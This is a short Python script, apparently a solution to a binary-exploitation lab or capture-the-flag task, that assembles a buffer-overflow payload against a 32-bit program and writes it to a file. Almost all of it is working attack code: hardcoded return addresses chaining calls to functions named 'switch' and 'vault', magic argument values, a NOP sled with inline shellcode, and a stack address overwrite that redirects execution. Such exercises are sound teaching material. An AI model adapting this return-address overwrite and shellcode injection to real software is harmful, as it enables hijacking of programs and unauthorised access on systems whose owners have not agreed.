import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

# Adresele functiilor

switchAddress = 0x0804893A
shellAddress = 0xbfffe944
vaultAddress = 0x0804882b

# Initialize payload.
payload = ''

# Add a number of 'offset' A characters to the payload.
offset = 8 * "A"

payload += "3\n"

payload += offset
payload += dw(0x08048895)
payload += dw(switchAddress)
payload += offset

payload += "3\n"

payload += offset
payload += dw(0x080488BA)
payload += dw(switchAddress)
payload += dw(0xDEADC0DE)
payload += "ffff"

payload += "3\n"

payload += offset
payload += dw(0x080488EA)
payload += dw(switchAddress)
payload += dw(0x78F26913)
payload += dw(0x65BB55DC)

payload += "4\n"

payload += "CristianSmarandoiu" #18 caractere
payload += 2 * "\x00"
payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" #10 #shellcode
payload += "\xB8\x00\x80\x20\xba\xA3\x68\xA3\x04\x08\xC3" #11
payload += 80 * "\x00"

payload +=  816  * "\x4E" + 67 * "\x4F"  #883 caractere
payload += dw(shellAddress)              #change the variable
payload += dw(vaultAddress)              #enter vault
payload += dw(switchAddress)             #gracefull exit "Bye"
payload += 8 * "\x00"

payload += "5\n" #Bye

# Use dw() function.

with open('payload', 'wb') as f:
    f.write(payload)
